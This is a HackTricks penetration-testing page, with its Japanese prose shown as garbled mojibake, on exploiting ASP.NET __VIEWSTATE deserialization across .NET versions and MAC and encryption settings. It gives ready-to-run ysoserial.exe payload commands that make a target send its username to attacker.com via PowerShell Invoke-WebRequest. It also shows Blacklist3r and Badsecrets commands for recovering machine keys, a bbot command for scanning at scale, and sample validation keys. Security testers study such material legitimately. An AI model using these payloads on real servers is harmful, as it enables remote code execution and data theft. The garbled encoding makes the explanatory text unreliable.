# Exploiting \_\_VIEWSTATE without knowing the secrets

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## What is ViewState

**ViewState** ã¯ã€ASP.NET ã«ãŠã‘ã‚‹ãƒšãƒ¼ã‚¸ã¨ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ãƒ‡ãƒ¼ã‚¿ã‚’ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸é–“ã§ç¶­æŒã™ã‚‹ãŸã‚ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã§ã™ã€‚ãƒšãƒ¼ã‚¸ã® HTML ã‚’ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã™ã‚‹éš›ã€ãƒšãƒ¼ã‚¸ã®ç¾åœ¨ã®çŠ¶æ…‹ã¨ãƒã‚¹ãƒˆãƒãƒƒã‚¯ä¸­ã«ä¿æŒã•ã‚Œã‚‹å€¤ãŒ base64 ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸæ–‡å­—åˆ—ã«ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œã¾ã™ã€‚ã“ã‚Œã‚‰ã®æ–‡å­—åˆ—ã¯ã€éš ã— ViewState ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã«é…ç½®ã•ã‚Œã¾ã™ã€‚

ViewState æƒ…å ±ã¯ã€ä»¥ä¸‹ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¾ãŸã¯ãã®çµ„ã¿åˆã‚ã›ã«ã‚ˆã£ã¦ç‰¹å¾´ä»˜ã‘ã‚‰ã‚Œã¾ã™ï¼š

* **Base64**:
* `EnableViewStateMac` ã¨ `ViewStateEncryptionMode` å±æ€§ãŒä¸¡æ–¹ã¨ã‚‚ false ã«è¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã«ä½¿ç”¨ã•ã‚Œã‚‹å½¢å¼ã§ã™ã€‚
* **Base64 + MAC (ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸èªè¨¼ã‚³ãƒ¼ãƒ‰) æœ‰åŠ¹**:
* MAC ã®æœ‰åŠ¹åŒ–ã¯ã€`EnableViewStateMac` å±æ€§ã‚’ true ã«è¨­å®šã™ã‚‹ã“ã¨ã§é”æˆã•ã‚Œã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ViewState ãƒ‡ãƒ¼ã‚¿ã®æ•´åˆæ€§æ¤œè¨¼ãŒæä¾›ã•ã‚Œã¾ã™ã€‚
* **Base64 + æš—å·åŒ–**:
* `ViewStateEncryptionMode` å±æ€§ãŒ true ã«è¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã«æš—å·åŒ–ãŒé©ç”¨ã•ã‚Œã€ViewState ãƒ‡ãƒ¼ã‚¿ã®æ©Ÿå¯†æ€§ãŒç¢ºä¿ã•ã‚Œã¾ã™ã€‚

## Test Cases

ã“ã®ç”»åƒã¯ã€.NET ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«åŸºã¥ã ASP.NET ã® ViewState ã®ç•°ãªã‚‹æ§‹æˆã‚’è©³ç´°ã«ç¤ºã—ãŸè¡¨ã§ã™ã€‚å†…å®¹ã®æ¦‚è¦ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™ï¼š

1. **ä»»æ„ã® .NET ãƒãƒ¼ã‚¸ãƒ§ãƒ³**ã®å ´åˆã€MAC ã¨æš—å·åŒ–ãŒç„¡åŠ¹ãªå ´åˆã€MachineKey ã¯å¿…è¦ãªãã€ã—ãŸãŒã£ã¦ãã‚Œã‚’ç‰¹å®šã™ã‚‹é©ç”¨å¯èƒ½ãªæ–¹æ³•ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚
2. **4.5 æœªæº€ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³**ã®å ´åˆã€MAC ãŒæœ‰åŠ¹ã§æš—å·åŒ–ãŒç„¡åŠ¹ãªå ´åˆã€MachineKey ãŒå¿…è¦ã§ã™ã€‚MachineKey ã‚’ç‰¹å®šã™ã‚‹æ–¹æ³•ã¯ã€ŒBlacklist3rã€ã¨å‘¼ã°ã‚Œã¾ã™ã€‚
3. **4.5 æœªæº€ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³**ã®å ´åˆã€MAC ãŒæœ‰åŠ¹ã‹ç„¡åŠ¹ã‹ã«ã‹ã‹ã‚ã‚‰ãšã€æš—å·åŒ–ãŒæœ‰åŠ¹ãªå ´åˆã€MachineKey ãŒå¿…è¦ã§ã™ã€‚MachineKey ã‚’ç‰¹å®šã™ã‚‹ã®ã¯ã€ŒBlacklist3r - Future Developmentã€ã®ã‚¿ã‚¹ã‚¯ã§ã™ã€‚
4. **4.5 ä»¥ä¸Šã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³**ã®å ´åˆã€MAC ã¨æš—å·åŒ–ã®ã™ã¹ã¦ã®çµ„ã¿åˆã‚ã›ï¼ˆä¸¡æ–¹ãŒ true ã§ã‚ã‚‹ã‹ã€ä¸€æ–¹ãŒ true ã§ä»–æ–¹ãŒ false ã§ã‚ã‚‹ã‹ï¼‰ã¯ã€MachineKey ã‚’å¿…è¦ã¨ã—ã¾ã™ã€‚MachineKey ã¯ã€ŒBlacklist3rã€ã‚’ä½¿ç”¨ã—ã¦ç‰¹å®šã§ãã¾ã™ã€‚

### Test Case: 1 â€“ EnableViewStateMac=false and viewStateEncryptionMode=false

`AspNetEnforceViewStateMac` ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‚­ãƒ¼ã‚’ã‚¼ãƒ­ã«è¨­å®šã™ã‚‹ã“ã¨ã§ã€ViewStateMAC ã‚’å®Œå…¨ã«ç„¡åŠ¹ã«ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ï¼š
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**ViewStateå±æ€§ã®ç‰¹å®š**

BurpSuiteã‚’ä½¿ç”¨ã—ã¦ã€ã“ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’å«ã‚€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£ã™ã‚‹ã“ã¨ã§ã€ViewStateãŒMACã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç‰¹å®šã§ãã¾ã™ã€‚MacãŒãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ä¿è­·ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¦ã„ãªã„å ´åˆã€[**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)ã‚’ä½¿ç”¨ã—ã¦ã“ã‚Œã‚’æ‚ªç”¨ã§ãã¾ã™ã€‚
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### Test case 1.5 â€“ ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹1ã¨åŒæ§˜ã§ã™ãŒã€ViewStateã‚¯ãƒƒã‚­ãƒ¼ã¯ã‚µãƒ¼ãƒãƒ¼ã«ã‚ˆã£ã¦é€ä¿¡ã•ã‚Œã¾ã›ã‚“

é–‹ç™ºè€…ã¯**ViewState**ã‚’HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ä¸€éƒ¨ã¨ã—ã¦é€ä¿¡ã—ãªã„ã‚ˆã†ã«**å‰Šé™¤**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã“ã®ã‚¯ãƒƒã‚­ãƒ¼ã‚’å—ã‘å–ã‚Šã¾ã›ã‚“ï¼‰ã€‚\
**ViewState**ãŒ**å­˜åœ¨ã—ãªã„**å ´åˆã€ãã®å®Ÿè£…ã¯**ViewStateã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã«èµ·å› ã™ã‚‹æ½œåœ¨çš„ãªè„†å¼±æ€§**ã‹ã‚‰**å®‰å…¨**ã§ã‚ã‚‹ã¨è€ƒãˆã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚\
ã—ã‹ã—ã€ãã‚Œã¯äº‹å®Ÿã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒœãƒ‡ã‚£ã«**ViewStateãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿**ã‚’è¿½åŠ ã—ã€ysoserialã‚’ä½¿ç”¨ã—ã¦ä½œæˆã—ãŸã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’é€ä¿¡ã™ã‚Œã°ã€**ã‚±ãƒ¼ã‚¹1**ã«ç¤ºã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«**ã‚³ãƒ¼ãƒ‰å®Ÿè¡Œ**ã‚’é”æˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### Test Case: 2 â€“ .Net < 4.5 ãŠã‚ˆã³ EnableViewStateMac=true & ViewStateEncryptionMode=false

ç‰¹å®šã®ãƒšãƒ¼ã‚¸ã«å¯¾ã—ã¦**ViewState MAC**ã‚’**æœ‰åŠ¹**ã«ã™ã‚‹ãŸã‚ã«ã¯ã€ç‰¹å®šã®aspxãƒ•ã‚¡ã‚¤ãƒ«ã«ä»¥ä¸‹ã®å¤‰æ›´ã‚’åŠ ãˆã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
å…¨ä½“ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ã¤ã„ã¦ã‚‚ã€ä»¥ä¸‹ã«ç¤ºã™ã‚ˆã†ã«**web.config**ãƒ•ã‚¡ã‚¤ãƒ«ã«è¨­å®šã™ã‚‹ã“ã¨ã§å®Ÿè¡Œã§ãã¾ã™:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¯MACã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹ãŸã‚ã€æ”»æ’ƒã‚’æˆåŠŸã•ã›ã‚‹ã«ã¯ã¾ãšä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã‚­ãƒ¼ãŒå¿…è¦ã§ã™ã€‚

ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã‚­ãƒ¼ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«[**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)ã‚’è©¦ã™ã“ã¨ãŒã§ãã¾ã™ã€‚
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) ã¯ã€æ—¢çŸ¥ã® machineKeys ã‚’ç‰¹å®šã§ãã‚‹åˆ¥ã®ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚Python ã§æ›¸ã‹ã‚Œã¦ã„ã‚‹ãŸã‚ã€Blacklist3r ã¨ã¯ç•°ãªã‚Šã€Windows ã®ä¾å­˜é–¢ä¿‚ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚.NET viewstates ç”¨ã«ã¯ã€ã€Œpython blacklist3rã€ãƒ¦ãƒ¼ãƒ†ã‚£ãƒªãƒ†ã‚£ãŒã‚ã‚Šã€ã“ã‚ŒãŒæœ€ã‚‚è¿…é€Ÿãªä½¿ç”¨æ–¹æ³•ã§ã™ã€‚

viewstate ã¨ generator ã‚’ç›´æ¥æä¾›ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
![https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

ã¾ãŸã¯ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆURLã«ç›´æ¥æ¥ç¶šã—ã€HTMLã‹ã‚‰viewstateã‚’åˆ‡ã‚Šå‡ºãã†ã¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
![https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

è„†å¼±ãª viewstate ã‚’å¤§è¦æ¨¡ã«æ¤œç´¢ã™ã‚‹ãŸã‚ã«ã€ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³åˆ—æŒ™ã¨çµ„ã¿åˆã‚ã›ã¦ã€`badsecrets` [**BBOT**](exploiting-\_\_viewstate-parameter.md) ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã§ãã¾ã™ï¼š
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

é‹ãŒè‰¯ã‘ã‚Œã°ã€ã‚­ãƒ¼ãŒè¦‹ã¤ã‹ã‚Šã€[**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**ã‚’ä½¿ç”¨ã—ã¦æ”»æ’ƒã‚’é€²ã‚ã‚‹ã“ã¨ãŒã§ãã¾ã™:**
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
ã‚µãƒ¼ãƒãƒ¼ã«ã‚ˆã£ã¦`_VIEWSTATEGENERATOR`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãŒ**é€ä¿¡ã•ã‚Œãªã„**å ´åˆã€`--generator`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’**æä¾›ã™ã‚‹å¿…è¦ã¯ã‚ã‚Šã¾ã›ã‚“ãŒã€ã“ã‚Œã‚‰ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¯å¿…è¦ã§ã™**:
```bash
--apppath="/" --path="/hello.aspx"
```
### ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹: 3 â€“ .Net < 4.5 ãŠã‚ˆã³ EnableViewStateMac=true/false ãŠã‚ˆã³ ViewStateEncryptionMode=true

ã“ã®å ´åˆã€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãŒMACã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹ã¯ä¸æ˜ã§ã™ã€‚ãã®ãŸã‚ã€å€¤ã¯ãŠãã‚‰ãæš—å·åŒ–ã•ã‚Œã¦ãŠã‚Šã€è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«**ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æš—å·åŒ–ã™ã‚‹ãŸã‚ã®ãƒã‚·ãƒ³ã‚­ãƒ¼ãŒå¿…è¦ã§ã™**ã€‚

**ã“ã®å ´åˆã€** [**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã¯é–‹ç™ºä¸­ã§ã™...**

**.NET 4.5ä»¥å‰ã§ã¯ã€** ASP.NETã¯**`ViewStateEncryptionMode`**ãŒ_**å¸¸ã«**_ã«è¨­å®šã•ã‚Œã¦ã„ã¦ã‚‚ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰ã®**æš—å·åŒ–ã•ã‚Œã¦ã„ãªã„**\_`__VIEWSTATE`\_ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’**å—ã‘å…¥ã‚Œã‚‹ã“ã¨ãŒã§ãã¾ã™**ã€‚ASP.NETã¯**`__VIEWSTATEENCRYPTED`**ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®**å­˜åœ¨**ã®ã¿ã‚’**ç¢ºèªã—ã¾ã™**ã€‚**ã“ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’å‰Šé™¤ã—ã€æš—å·åŒ–ã•ã‚Œã¦ã„ãªã„ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’é€ä¿¡ã™ã‚‹ã¨ã€ãã‚Œã§ã‚‚å‡¦ç†ã•ã‚Œã¾ã™ã€‚**

ã—ãŸãŒã£ã¦ã€æ”»æ’ƒè€…ãŒãƒ•ã‚¡ã‚¤ãƒ«ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã®ã‚ˆã†ãªåˆ¥ã®è„†å¼±æ€§ã‚’ä»‹ã—ã¦ãƒã‚·ãƒ³ã‚­ãƒ¼ã‚’å–å¾—ã™ã‚‹æ–¹æ³•ã‚’è¦‹ã¤ã‘ãŸå ´åˆã€**ã‚±ãƒ¼ã‚¹2**ã§ä½¿ç”¨ã•ã‚ŒãŸ[**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€ViewStateã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºè„†å¼±æ€§ã‚’åˆ©ç”¨ã—ã¦RCEã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚

* ViewStateã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºè„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‹ã‚‰`__VIEWSTATEENCRYPTED`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’å‰Šé™¤ã—ã¦ãã ã•ã„ã€‚ãã†ã—ãªã„ã¨ã€Viewstate MACæ¤œè¨¼ã‚¨ãƒ©ãƒ¼ãŒè¿”ã•ã‚Œã€æ‚ªç”¨ã¯å¤±æ•—ã—ã¾ã™ã€‚

### ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹: 4 â€“ .Net >= 4.5 ãŠã‚ˆã³ EnableViewStateMac=true/false ãŠã‚ˆã³ ViewStateEncryptionMode=true/false ãŸã ã—ä¸¡æ–¹ã®å±æ€§ãŒfalseã®å ´åˆ

ä»¥ä¸‹ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’web.configãƒ•ã‚¡ã‚¤ãƒ«å†…ã«æŒ‡å®šã™ã‚‹ã“ã¨ã§ã€ASP.NETãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã®ä½¿ç”¨ã‚’å¼·åˆ¶ã§ãã¾ã™ã€‚
```xml
<httpRuntime targetFramework="4.5" />
```
ä»£ã‚ã‚Šã«ã€ã“ã‚Œã¯web.configãƒ•ã‚¡ã‚¤ãƒ«ã®`machineKey`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿å†…ã«ä»¥ä¸‹ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’æŒ‡å®šã™ã‚‹ã“ã¨ã§è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
compatibilityMode="Framework45"
```
å‰è¿°ã®ã‚ˆã†ã«ã€**å€¤ã¯æš—å·åŒ–ã•ã‚Œã¦ã„ã¾ã™ã€‚** ãã®ãŸã‚ã€**æœ‰åŠ¹ãªãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’é€ä¿¡ã™ã‚‹ã«ã¯æ”»æ’ƒè€…ãŒã‚­ãƒ¼ã‚’å¿…è¦ã¨ã—ã¾ã™ã€‚**

[**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)ã‚’ä½¿ç”¨ã—ã¦ã€ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã‚­ãƒ¼ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
IISDirPathã¨TargetPagePathã®è©³ç´°ãªèª¬æ˜ã«ã¤ã„ã¦ã¯ã€[ã“ã¡ã‚‰ã‚’å‚ç…§ã—ã¦ãã ã•ã„](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

ã¾ãŸã¯ã€[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets)ï¼ˆã‚¸ã‚§ãƒãƒ¬ãƒ¼ã‚¿ãƒ¼å€¤ä»˜ãï¼‰ã‚’ä½¿ç”¨ã—ã¦ï¼š
```bash
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
![https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

æœ‰åŠ¹ãªMachine keyãŒç‰¹å®šã•ã‚Œã‚‹ã¨ã€**æ¬¡ã®ã‚¹ãƒ†ãƒƒãƒ—ã¯** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) **ã‚’ä½¿ç”¨ã—ã¦ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã™ã‚‹ã“ã¨ã§ã™ã€‚**
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
`__VIEWSTATEGENERATOR`ã®å€¤ãŒã‚ã‚‹å ´åˆã€ãã®å€¤ã‚’ä½¿ã£ã¦`--generator`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’**ä½¿ç”¨**ã—ã€`--path`ãŠã‚ˆã³`--apppath`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’**çœç•¥**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.2.png)

ViewStateã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºè„†å¼±æ€§ã®æˆåŠŸã—ãŸæ‚ªç”¨ã¯ã€æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ã‚µãƒ¼ãƒãƒ¼ã¸ã®ã‚¢ã‚¦ãƒˆã‚ªãƒ–ãƒãƒ³ãƒ‰ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å¼•ãèµ·ã“ã—ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’å«ã¿ã¾ã™ã€‚ã“ã®ç¨®ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã¯ã€ã€ŒExploiting ViewState Deserialization using Blacklist3r and YsoSerial.NETã€ã¨ã„ã†ãƒªã‚½ãƒ¼ã‚¹ã‚’é€šã˜ã¦è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã‚‹æ¦‚å¿µå®Ÿè¨¼ï¼ˆPoCï¼‰ã§ç¤ºã•ã‚Œã¦ã„ã¾ã™ã€‚æ‚ªç”¨ãƒ—ãƒ­ã‚»ã‚¹ã®ä»•çµ„ã¿ã‚„ã€MachineKeyã‚’ç‰¹å®šã™ã‚‹ãŸã‚ã«Blacklist3rã®ã‚ˆã†ãªãƒ„ãƒ¼ãƒ«ã‚’åˆ©ç”¨ã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦ã®è©³ç´°ã¯ã€æä¾›ã•ã‚ŒãŸ[æˆåŠŸã—ãŸæ‚ªç”¨ã®PoC](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚

### ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹ 6 â€“ ViewStateUserKeysãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹

**ViewStateUserKey**ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¯ã€**CSRFæ”»æ’ƒ**ã«å¯¾ã—ã¦**é˜²å¾¡**ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚ãã®ã‚ˆã†ãªã‚­ãƒ¼ãŒã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§å®šç¾©ã•ã‚Œã¦ã„ã‚‹å ´åˆã€ã“ã‚Œã¾ã§ã«è­°è«–ã—ãŸæ–¹æ³•ã§**ViewState**ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã—ã‚ˆã†ã¨ã™ã‚‹ã¨ã€**ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ã‚ˆã£ã¦å‡¦ç†ã•ã‚Œã¾ã›ã‚“**ã€‚\
